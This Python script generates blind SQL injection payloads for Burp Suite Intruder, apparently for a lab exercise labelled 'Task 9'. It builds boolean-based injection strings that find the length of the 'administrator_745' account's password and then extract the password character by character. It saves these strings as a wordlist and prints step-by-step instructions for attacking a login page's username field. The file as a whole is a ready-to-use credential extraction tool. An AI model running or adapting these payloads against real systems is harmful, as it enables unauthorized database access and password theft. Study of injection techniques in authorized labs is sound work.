#!/usr/bin/env python3
"""
Burp Suite Payload Generator for Task 9 - Blind SQL Injection
Generates payloads to extract administrator_745 password character by character
"""

import string
import sys

def generate_position_payloads(position, charset=None):
    """Generate payloads for testing characters at a specific position"""
    if charset is None:
        # Common password characters
        charset = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    
    payloads = []
    
    for char in charset:
        # Escape single quotes for SQL
        escaped_char = char.replace("'", "''")
        
        payload = f"administrator_745' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator_745')='{escaped_char}' -- "
        payloads.append({
            'position': position,
            'character': char,
            'payload': payload
        })
    
    return payloads

def generate_length_payloads(max_length=30):
    """Generate payloads to determine password length"""
    payloads = []
    
    for length in range(1, max_length + 1):
        payload = f"administrator_745' AND (SELECT LENGTH(password) FROM users WHERE username='administrator_745')={length} -- "
        payloads.append({
            'length': length,
            'payload': payload
        })
    
    return payloads

def generate_all_payloads(max_positions=20):
    """Generate all payloads for complete password extraction"""
    print("# Burp Suite Intruder Payloads for Task 9")
    print("# Blind SQL Injection - administrator_745 Password Extraction")
    print("# " + "=" * 60)
    print()
    
    print("## Step 1: Determine Password Length")
    print("# Use these payloads in Burp Intruder to find password length")
    print("# Look for different response patterns (length, timing, errors)")
    print()
    
    length_payloads = generate_length_payloads()
    for payload_info in length_payloads:
        print(f"# Length {payload_info['length']:2d}: {payload_info['payload']}")
    
    print("\n" + "=" * 70)
    print()
    
    print("## Step 2: Extract Password Characters")
    print("# Once you know the length, use these payloads for each position")
    print("# Set Burp Intruder payload position in the username field")
    print()
    
    # Generate payloads for first few positions as examples
    for position in range(1, min(max_positions + 1, 6)):  # Show first 5 positions
        print(f"### Position {position} Payloads:")
        position_payloads = generate_position_payloads(position)
        
        # Show some example characters
        example_chars = ['a', 'b', 'c', 'd', 'e', '1', '2', '3', '@', '!']
        for payload_info in position_payloads:
            if payload_info['character'] in example_chars:
                print(f"# '{payload_info['character']}': {payload_info['payload']}")
        
        print(f"# ... (continue with all {len(position_payloads)} characters)")
        print()

def save_burp_wordlist(filename="blind_sqli_payloads.txt", max_positions=10):
    """Save payloads in a format suitable for Burp Suite wordlist"""
    with open(filename, 'w') as f:
        # First add length detection payloads
        f.write("# Password Length Detection Payloads\n")
        length_payloads = generate_length_payloads()
        for payload_info in length_payloads:
            f.write(f"{payload_info['payload']}\n")
        
        f.write("\n# Character Extraction Payloads\n")
        
        # Then add character extraction payloads
        for position in range(1, max_positions + 1):
            f.write(f"\n# Position {position} payloads\n")
            position_payloads = generate_position_payloads(position)
            for payload_info in position_payloads:
                f.write(f"{payload_info['payload']}\n")
    
    print(f"✅ Payloads saved to {filename}")
    print(f"📝 Load this file in Burp Suite Intruder as a wordlist")

def generate_manual_test_payloads():
    """Generate payloads for manual testing first few characters"""
    print("🔍 Manual Testing Payloads")
    print("=" * 40)
    print()
    
    print("## Test if injection works:")
    print("# True condition (should behave differently than false)")
    print("administrator_745' AND 1=1 -- ")
    print()
    print("# False condition")
    print("administrator_745' AND 1=2 -- ")
    print()
    
    print("## Test first character of password:")
    test_chars = ['a', 'b', 'c', 'd', 'e', 'p', 'q', 'r', 's', 't', '1', '2', '3', '4', '5']
    for char in test_chars:
        escaped_char = char.replace("'", "''")
        payload = f"administrator_745' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator_745')='{escaped_char}' -- "
        print(f"# Test '{char}': {payload}")

def main():
    if len(sys.argv) > 1:
        if sys.argv[1] == "--wordlist":
            filename = sys.argv[2] if len(sys.argv) > 2 else "blind_sqli_payloads.txt"
            save_burp_wordlist(filename)
            return
        elif sys.argv[1] == "--manual":
            generate_manual_test_payloads()
            return
        elif sys.argv[1] == "--help":
            print("Usage:")
            print("  python3 burp_payloads_generator.py                    # Generate all payloads")
            print("  python3 burp_payloads_generator.py --wordlist [file]  # Save as Burp wordlist")
            print("  python3 burp_payloads_generator.py --manual           # Manual test payloads")
            print("  python3 burp_payloads_generator.py --help             # Show this help")
            return
    
    # Default: generate all payloads
    generate_all_payloads()
    
    print("\n" + "=" * 70)
    print()
    print("🎯 Burp Suite Setup Instructions:")
    print("-" * 35)
    print("1. Go to login page")
    print("2. Capture login request")
    print("3. Send to Intruder (Ctrl+I)")
    print("4. Set payload position in username field: §username§")
    print("5. Select 'Sniper' attack type")
    print("6. Load payloads from above or generated wordlist")
    print("7. Start attack and analyze responses")
    print()
    print("🔍 What to look for:")
    print("- Different response lengths")
    print("- Different response times")
    print("- Different HTTP status codes")
    print("- Different error messages")
    print("- Missing error messages (success case)")
    print()
    print("💡 Tips:")
    print("- Sort results by response length in Burp")
    print("- Look for outliers in timing or content")
    print("- True conditions often have different responses than false ones")

if __name__ == "__main__":
    main() 